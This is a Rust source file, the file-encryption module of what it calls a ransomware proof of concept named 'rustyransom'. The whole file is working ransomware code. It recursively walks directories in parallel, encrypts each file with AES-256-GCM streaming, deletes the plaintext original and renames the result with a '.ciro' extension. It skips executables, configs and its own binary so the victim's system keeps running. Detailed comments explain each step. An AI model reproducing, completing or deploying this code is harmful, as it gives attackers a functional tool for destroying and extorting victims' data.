//! # File Encryption Module
//!
//! This module implements the core file encryption functionality for the ransomware PoC.
//! It uses AES-256-GCM in streaming mode to encrypt files with minimal memory footprint,
//! enabling encryption of arbitrarily large files without loading them entirely into RAM.
//!
//! ## Architecture
//!
//! - **Algorithm**: AES-256-GCM (Galois/Counter Mode) - provides both confidentiality and authenticity
//! - **Mode**: Streaming encryption with 4KB chunks to prevent memory overflow
//! - **Parallelization**: Rayon-based parallel directory traversal for maximum throughput
//! - **Self-Protection**: Comprehensive mechanisms to prevent self-encryption
//!
//! ## Key Security Features
//!
//! 1. **Extension Blacklist**: Critical file types (.key, .exe, .dll, .so, etc.) are never encrypted
//! 2. **Self-Executable Detection**: Uses canonical path comparison to prevent encrypting the ransomware binary
//! 3. **No-Extension Protection**: Files without extensions (Linux binaries) are automatically protected
//! 4. **Per-File Nonces**: Each file gets a unique cryptographic nonce stored at the beginning of the encrypted file
//!
//! ## Encryption Process
//!
//! 1. Generate a unique 12-byte nonce for each file using `OsRng` (cryptographically secure)
//! 2. Initialize AES-GCM stream encryptor with the first 7 bytes of the nonce
//! 3. Write the 7-byte nonce to the output file (needed for decryption)
//! 4. Stream-encrypt the file in 4KB chunks
//! 5. Finalize encryption with `encrypt_last()` (handles padding/authentication)
//! 6. Delete the original plaintext file
//! 7. Append `.ciro` extension with key index to the encrypted file
//!
//! ## Error Handling
//!
//! All encryption errors are caught and logged without crashing the process, ensuring that
//! locked files, permission errors, or I/O failures don't interrupt the overall encryption operation.

use aes_gcm::{
    Aes256Gcm,
    aead::{AeadCore, OsRng, generic_array::GenericArray, stream::EncryptorBE32},
};
use rayon::prelude::*;
use std::{
    env,
    fs::{File, read_dir, remove_file},
    io::{BufReader, Read, Write},
    path::{Path, PathBuf}
};

/// Determines if a file should be encrypted based on extension blacklist.
///
/// This function implements the first line of defense against self-encryption and
/// system instability. It uses a hardcoded blacklist of critical file extensions
/// that should never be encrypted.
///
/// # Blacklist Categories
///
/// - **Recovery Files**: `.key` (contains encrypted session key)
/// - **Already Encrypted**: `.ciro` (our encrypted file marker)
/// - **Windows Executables**: `.exe`, `.dll`, `.sys` (prevents Windows system corruption)
/// - **Linux Binaries**: `.so`, `.ko` (prevents Linux system corruption)
///
/// # No-Extension Protection
///
/// Files without extensions are **automatically protected**. This is critical for Linux systems
/// where executables typically have no extension (e.g., `/bin/ls`, `./rustyransom`).
///
/// # Arguments
///
/// * `path` - File path to check
///
/// # Returns
///
/// * `true` - File should be encrypted (extension not in blacklist)
/// * `false` - File should be skipped (blacklisted or no extension)
///
/// # Examples
///
/// ```ignore
/// assert_eq!(should_encrypt(Path::new("document.txt")), true);
/// assert_eq!(should_encrypt(Path::new("session.key")), false);
/// assert_eq!(should_encrypt(Path::new("malware.exe")), false);
/// assert_eq!(should_encrypt(Path::new("rustyransom")), false); // No extension
/// ```
fn should_encrypt(path: &Path) -> bool {
    // Blacklist: extensions that should NEVER be encrypted
    const BLACKLIST: &[&str] = &[
        "key",  // Recovery key file
        "ciro", // Already encrypted files
        "exe",  // Windows executables (ransomware binary)
        "dll",  // Windows libraries
        "sys",  // Windows system files
        "so",   // Linux shared libraries
        "ko",   // Linux kernel modules
        "service", // Linux systemd service files
        "desktop", // Linux desktop files
        "conf", // configuration files
        "cfg", // configuration files
        "ini", // configuration files
        "gpg", // gpg files
        
    ];

    // Get extension, return false if no extension (protect binaries like "rustyransom")
    let ext = match path.extension() {
        Some(e) => e.to_string_lossy().to_lowercase(),
        None => return false, // No extension = don't encrypt (protects Linux binaries)
    };

    // Check if extension is in blacklist
    !BLACKLIST.contains(&ext.as_str())
}

/// Checks if a given path points to the ransomware executable itself.
///
/// This function prevents the ransomware from encrypting its own binary, which would
/// cause immediate failure on next execution. It uses canonical path resolution to
/// handle symlinks and relative paths correctly.
///
/// # How It Works
///
/// 1. Get the current executable path using `env::current_exe()`
/// 2. Canonicalize both paths (resolves symlinks, relative paths, and `.` / `..` components)
/// 3. Compare the canonical paths for exact equality
///
/// # Arguments
///
/// * `path` - Path to check against the current executable
///
/// # Returns
///
/// * `true` - The path points to the ransomware executable itself
/// * `false` - The path is a different file, or canonicalization failed
///
/// # Error Handling
///
/// If path canonicalization fails (e.g., file doesn't exist, permission denied),
/// the function returns `false` to fail-safe (better to skip encryption than crash).
///
/// # Examples
///
/// ```ignore
/// // Assuming current executable is /home/user/rustyransom
/// assert_eq!(is_self_executable(Path::new("/home/user/rustyransom")), true);
/// assert_eq!(is_self_executable(Path::new("./rustyransom")), true); // Relative path
/// assert_eq!(is_self_executable(Path::new("/home/user/document.txt")), false);
/// ```
fn is_self_executable(path: &Path) -> bool {
    if let Ok(current_exe) = env::current_exe() {
        // Compare canonical paths (resolves symlinks)
        if let (Ok(exe_canonical), Ok(path_canonical)) =
            (current_exe.canonicalize(), path.canonicalize())
        {
            return exe_canonical == path_canonical;
        }
    }
    false
}

/// Encrypts a single file using AES-256-GCM in streaming mode.
///
/// This function implements streaming encryption to handle files of any size with constant
/// memory usage (~4KB buffer). The encrypted output includes the nonce at the beginning,
/// followed by the ciphertext.
///
/// # Encryption Scheme
///
/// - **Algorithm**: AES-256-GCM (Galois/Counter Mode with AEAD)
/// - **Nonce**: 12-byte cryptographically secure random nonce (first 7 bytes used for stream mode)
/// - **Chunk Size**: 4KB for streaming (prevents memory exhaustion)
/// - **Output Format**: `[7-byte nonce][encrypted chunks][final tag]`
///
/// # Process
///
/// 1. Generate a 12-byte nonce using `OsRng` (hardware RNG on modern systems)
/// 2. Initialize stream encryptor with first 7 bytes of nonce (AES-GCM stream mode requirement)
/// 3. Write the 7-byte nonce to the new file (needed for decryption later)
/// 4. Read the input file in 4KB chunks and encrypt each chunk
/// 5. Finalize with `encrypt_last()` to complete authentication tag
/// 6. Delete the original plaintext file
///
/// # Arguments
///
/// * `path` - Path to the plaintext file to encrypt
/// * `cipher` - AES-256-GCM cipher instance (cloned for thread-safety in parallel execution)
/// * `key_count` - Session key index for tagging encrypted files
///
/// # Returns
///
/// * `Ok(())` - File successfully encrypted and original deleted
/// * `Err(std::io::Error)` - I/O error (file access, write failure) or encryption error
///
/// # File Naming
///
/// The encrypted file is created with a `.ciro` extension and key index tag:
/// - `document.txt` → `document_0.txt.ciro` (if key_count=0)
/// - `photo.jpg` → `photo_1.jpg.ciro` (if key_count=1)
/// - `file` (no extension) → `file_2.ciro` (if key_count=2)
///
/// This allows mapping which recovery key can decrypt which files.
///
/// # Errors
///
/// This function can return errors in the following cases:
/// - File cannot be opened (permissions, file locked, doesn't exist)
/// - Write failure (disk full, read-only filesystem)
/// - Encryption failure (should never happen with correct key, but propagated for safety)
///
/// # Security Notes
///
/// - **Nonce Uniqueness**: Each file gets a unique nonce. AES-GCM security requires nonces never repeat.
/// - **Authentication**: GCM mode provides built-in authentication tag (detects tampering).
/// - **Memory Safety**: Only 4KB held in memory at once, suitable for multi-GB files.
fn encrypt_file(path: PathBuf, cipher: Aes256Gcm, key_count: usize) -> Result<(), std::io::Error> {
    // Generate cryptographically secure random nonce (12 bytes for AES-GCM)
    let nonce = Aes256Gcm::generate_nonce(&mut OsRng);

    // Stream encryptor requires 7-byte nonce (not the full 12-byte GCM nonce)
    let nonce_stream = GenericArray::from_slice(&nonce[0..7]);
    let mut encryptor = EncryptorBE32::from_aead(cipher, nonce_stream);

    let file = File::open(&path)?;
    // BufReader wraps file I/O with buffering to minimize syscalls and improve performance
    let mut reader = BufReader::new(file);
    let mut buffer = vec![0; 4096]; // 4KB chunks - balance between memory usage and I/O efficiency

    // Construct output filename with .ciro extension
    let mut new_path = path.clone();
    let file_stem = new_path.file_stem()
        .ok_or_else(|| std::io::Error::other("File has no stem"))?
        .to_string_lossy()
        .to_string();
    
    let original_extension = new_path.extension()
        .map(|e| e.to_string_lossy().to_string());
    
    // Build filename: stem_keyindex.originalext.ciro or stem_keyindex.ciro
    let new_filename = match original_extension {
        Some(ext) => format!("{}_{}.{}.ciro", file_stem, key_count, ext),
        None => format!("{}_{}.ciro", file_stem, key_count),
    };

    new_path.set_file_name(new_filename);
    let mut new_file = File::create(new_path)?;
    
    // Write nonce at beginning of encrypted file (required for decryption)
    new_file.write_all(nonce_stream)?;

    // Stream encryption loop: read → encrypt → write chunks
    loop {
        let bytes_read = reader.read(&mut buffer)?;
        if bytes_read == 0 {
            break; // EOF reached
        }

        let ciphertext = encryptor
            .encrypt_next(&buffer[0..bytes_read])
            .map_err(|_| std::io::Error::other("Encryption error"))?;

        new_file.write_all(&ciphertext)?;
    }

    // Finalize encryption: produces authentication tag for GCM mode
    let ciphertext_last = encryptor
        .encrypt_last(b"".as_ref())
        .map_err(|_| std::io::Error::other("Last encryption error"))?;
    new_file.write_all(&ciphertext_last)?;

    // Delete original plaintext file (ignore errors - file might be locked/read-only)
    let _ = remove_file(path);

    Ok(())
}

/// Recursively encrypts all files in a directory tree using parallel traversal.
///
/// This is the main entry point for the encryption operation. It leverages Rayon's
/// parallel iterators to maximize throughput by encrypting multiple files simultaneously
/// across CPU cores.
///
/// # Architecture
///
/// - **Parallelization**: Uses Rayon's `par_bridge()` to parallelize directory traversal
/// - **Recursion**: Recursively processes subdirectories
/// - **Self-Protection**: Skips the ransomware executable itself
/// - **Blacklist Filtering**: Applies extension blacklist before encryption
/// - **Error Resilience**: Continues operation even if individual files fail
///
/// # Process
///
/// 1. Read directory entries
/// 2. For each entry (in parallel):
///    - Check if it's the ransomware binary (skip if yes)
///    - If directory: recurse with `encrypt_files()`
///    - If file: check blacklist, then encrypt if allowed
/// 3. Log errors for failed files but continue
///
/// # Arguments
///
/// * `dir` - Root directory to start encryption from
/// * `cipher` - AES-256-GCM cipher instance (cloned for each parallel worker)
/// * `key_count` - Session key index for tagging encrypted files
///
/// # Panics
///
/// This function does not panic. All errors are caught and logged.
///
/// # Performance Notes
///
/// - **CPU Utilization**: Scales with available CPU cores (Rayon uses thread pool)
/// - **I/O Bound**: Performance limited by disk speed for large files
/// - **Memory**: Each parallel worker uses ~4KB buffer (very low memory footprint)
///
/// # Safety
///
/// The cipher is cloned for each parallel task to ensure thread-safety. AES-GCM
/// cipher state is not shared between threads, preventing race conditions.
///
/// # Examples
///
/// ```ignore
/// use aes_gcm::{Aes256Gcm, aead::OsRng};
/// let cipher = Aes256Gcm::new(&Aes256Gcm::generate_key(&mut OsRng));
/// let key_count = 0; // First session
/// encrypt_files(PathBuf::from("/home/user/documents"), cipher, key_count);
/// ```
pub fn encrypt_files(dir: PathBuf, cipher: Aes256Gcm, key_count: usize) {
    if let Ok(entries) = read_dir(dir) {
        // Parallel iteration over directory entries using Rayon
        entries.par_bridge().into_par_iter().for_each(|entry| {
            if let Ok(entry) = entry {
                let path = entry.path();

                // Self-protection: Never encrypt the ransomware executable itself
                if is_self_executable(&path) {
                    return;
                }

                if path.is_dir() {
                    // Recurse into subdirectories (each worker handles its own subtree)
                    encrypt_files(path, cipher.clone(), key_count);
                } else if should_encrypt(&path)
                    && let Err(e) = encrypt_file(path, cipher.clone(), key_count)
                {
                    // Log error but continue with other files (error resilience)
                    println!("Error: {e}");
                }
            }
        });
    }
}
